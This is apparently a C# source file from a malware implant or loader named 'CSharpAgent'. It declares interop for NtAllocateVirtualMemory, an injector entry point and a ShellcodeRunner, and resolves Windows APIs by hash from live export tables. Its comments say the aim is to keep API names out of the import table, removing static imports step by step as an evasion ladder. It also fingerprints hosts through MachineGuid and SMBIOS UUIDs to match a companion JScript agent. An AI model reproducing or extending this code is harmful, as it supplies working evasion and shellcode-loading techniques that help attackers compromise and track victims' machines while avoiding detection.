using System;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    [StructLayout(LayoutKind.Sequential)]
    internal struct SYSTEM_INFO
    {
        public ushort wProcessorArchitecture;
        public ushort wReserved;
        public uint dwPageSize;
        public IntPtr lpMinimumApplicationAddress;
        public IntPtr lpMaximumApplicationAddress;
        public IntPtr dwActiveProcessorMask;
        public uint dwNumberOfProcessors;
        public uint dwProcessorType;
        public uint dwAllocationGranularity;
        public ushort wProcessorLevel;
        public ushort wProcessorRevision;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct OSVERSIONINFOW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate IntPtr GetTEBDelegate();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate int NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref UIntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate int EntryDelegate(ulong injectorVersion);

    internal static class NativeImports
    {
        // NOTE (audit No.21): the ladder strips static imports one rung at a time — rung 1
        // took VirtualProtect + FlushInstructionCache (ShellcodeRunner resolves both from
        // the live kernel32 export table by hash), rung 2 took RtlGetVersion (below). The
        // three declarations remaining are Identity's probes — later rungs.

        // --- Dynamic-resolution core (audit No.21) --------------------------------------
        // Managed module lookup — the base address every hash resolve starts from. NO
        // GetModuleHandle import: System.dll (already the single reference) enumerates the
        // process's own modules, and a WOW64 process lists its 32-bit DLLs — the ones this
        // code can actually call — so bitness always matches the process.
        internal static IntPtr ModuleBase(string lowerName)
        {
            var modules = System.Diagnostics.Process.GetCurrentProcess().Modules;
            for (var i = 0; i < modules.Count; i++)
                if (string.Compare(modules[i].ModuleName, lowerName, true) == 0)
                    return modules[i].BaseAddress;
            return IntPtr.Zero;
        }

        // Truthful OS version (Environment.OSVersion inherits the host manifest's
        // compatibility lies on Windows 8.1+) — resolved at call time from the live ntdll
        // export table by hash instead of a static import (audit No.21, rung 2): the API
        // name never rides the import table. The caller (Identity's OS probe) already
        // degrades to Environment.OSVersion if this throws. Returns 0 on success.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int OsVersionFn(ref OSVERSIONINFOW versionInfo);
        private static OsVersionFn _osVersion;

        internal static int GetOsVersion(ref OSVERSIONINFOW versionInfo)
        {
            if (_osVersion == null)
            {
                var ntdll = ModuleBase("ntdll.dll");
                if (ntdll == IntPtr.Zero)
                    throw new InvalidOperationException("ntdll.dll is not in the process module list");
                var proc = ShellcodeRunner.GetProcAddressByHash(ntdll, 1070062793); // djb2(77777) "rtlgetversion"
                if (proc == IntPtr.Zero)
                    throw new InvalidOperationException("ntdll export hash did not resolve");
                _osVersion = (OsVersionFn)Marshal.GetDelegateForFunctionPointer(proc, typeof(OsVersionFn));
            }
            return _osVersion(ref versionInfo);
        }

        [DllImport("kernel32.dll")]
        internal static extern void GetNativeSystemInfo(out SYSTEM_INFO lpSystemInfo);

        // MachineGuid through the EXPLICIT 32-bit registry view — see Identity.MachineGuid32View.
        // dwFlags = RRF_RT_REG_SZ | RRF_SUBKEY_WOW6432KEY (RegGetValue takes its OWN wow64
        // selectors — the KEY_WOW64_*KEY bits belong to RegOpenKeyEx's samDesired and are
        // silently ignored here); returns 0 (ERROR_SUCCESS) on success. The 64-bit view is
        // deliberately never requested: the JScript host can only reach the 32-bit view, so
        // that is the canonical identity source for every breed.
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int RegGetValue(
            IntPtr hkey, string lpSubKey, string lpValue, uint dwFlags,
            out uint pdwType, byte[] pvData, ref uint pcbData);

        // Raw SMBIOS tables ('RSMB') for the UUID fallback — the same value the JScript agent's
        // Win32_ComputerSystemProduct fallback yields, read without a WMI dependency. Returns
        // the required buffer size when called with a null buffer.
        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern uint GetSystemFirmwareTable(
            uint firmwareTableProviderSignature, uint firmwareTableID,
            byte[] firmwareTableBuffer, uint size);
    }
}
